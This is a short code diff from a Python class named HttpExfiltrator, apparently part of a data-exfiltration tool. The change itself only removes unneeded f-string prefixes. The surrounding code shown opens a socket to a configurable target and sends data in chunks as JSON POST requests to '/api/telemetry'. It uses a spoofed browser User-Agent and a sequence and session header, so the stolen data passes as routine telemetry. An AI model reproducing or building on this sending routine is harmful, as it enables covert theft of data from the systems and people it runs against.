@@ -185,14 +185,14 @@ class HttpExfiltrator:
             try:
                 sock = socket.create_connection((self.target, self.port), timeout=5)
                 request = (
-                    f"POST /api/telemetry HTTP/1.1\r\n"
+                    "POST /api/telemetry HTTP/1.1\r\n"
                     f"Host: {self.target}\r\n"
-                    f"User-Agent: Mozilla/5.0\r\n"
+                    "User-Agent: Mozilla/5.0\r\n"
                     f"X-Request-ID: {seq}\r\n"
                     f"X-Session: {hashlib.md5(data[:16]).hexdigest()[:8]}\r\n"
-                    f"Content-Type: application/json\r\n"
+                    "Content-Type: application/json\r\n"
                     f"Content-Length: {len(chunk) + 20}\r\n"
-                    f"\r\n"
+                    "\r\n"
                     f'{{"data":"{chunk}","seq":{seq}}}'
                 )
                 sock.sendall(request.encode())
